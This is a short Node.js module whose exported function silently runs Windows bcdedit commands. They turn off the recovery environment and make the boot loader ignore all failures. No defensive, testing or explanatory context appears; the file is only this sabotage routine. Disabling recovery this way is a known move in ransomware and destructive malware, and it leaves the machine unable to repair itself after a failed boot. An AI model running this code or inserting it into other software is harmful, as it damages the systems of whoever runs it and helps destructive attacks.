const {execSync} = require('child_process');
module.exports = function () {
  execSync('bcdedit /set {default} recoveryenabled No');
  execSync('bcdedit /set {default} bootstatuspolicy ignoreallfailures');
};
